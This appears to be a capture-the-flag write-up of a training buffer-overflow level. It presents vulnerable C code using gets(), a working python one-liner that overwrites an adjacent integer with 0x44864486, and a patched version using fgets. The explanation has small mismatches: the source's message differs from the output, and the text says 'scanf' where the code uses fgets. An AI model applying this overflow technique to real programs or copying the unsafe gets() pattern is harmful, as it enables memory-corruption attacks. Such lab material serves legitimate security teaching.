Let's take a look at the source code...

```
#include <stdio.h>
#include <stdlib.h>

int main()
{
    char buffer[489];
    int g;
    gets(buffer);
    if(g == 0x44864486)
    {
        printf("Your first trainning is complete operative.\n");
    }

}
```

So as we can see here, this program suffers from the same vulnerabillity that level 0 suffered from. The inproper use of the gets() function (really that function shouldn't be used at all).
The buffer is the same size, and the integer is stored right next to the buffer so we should be able to reach the buffer in the same manner.
However this time, the integer is being compared to the hex value 0x44864486 (equivalent to 1149650054 in decimal). This won't be a problem however
since we can just push that value to the integer. That hex value is four bytes (just like ints in 32 bit C programs) so we shouldn't have a problem pushing to it. So our exploit will look like this

```
  filler (489 bytes to fill buffer space) + 0x44864486
```

One thing, due to how C programs read hex values we will have to push the hex in little endian format (least significant bit first). Essentially we will have to break the hex string up into four seperate pieces, and push them on in reverse order (and we ignore the 0x in the beginning). Look at the actual exploit for more detail. 

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b1$ python -c 'print "1"*489 + "\x86\x44\x86\x44"' | ./b1 
Just a little bit harder. But not as hard as all of the research you have to do. Level Cleared!
```

And just like that, we pwned the binary. Now let's patch it. It has the same vulnerabillity as the previous challenge, so the fix is the same.

```
#include <stdio.h>
#include <stdlib.h>

int main()
{
    char buffer[489];
    int g;
    fgets(buffer, sizeof(buffer), stdin);
    if(g == 0x44864486)
    {
        printf("Just a little bit harder.\n");
    }

}
```

So we replace gets with scanf, and limited the amount of input it can take to the size of buffer so it can't overflow it. Now let's test it.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b1$ python -c 'print "1"*489 + "\x86\x44\x86\x44"' | ./b1_secure 
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b1$ 
```

And just like that, we patched the binary.

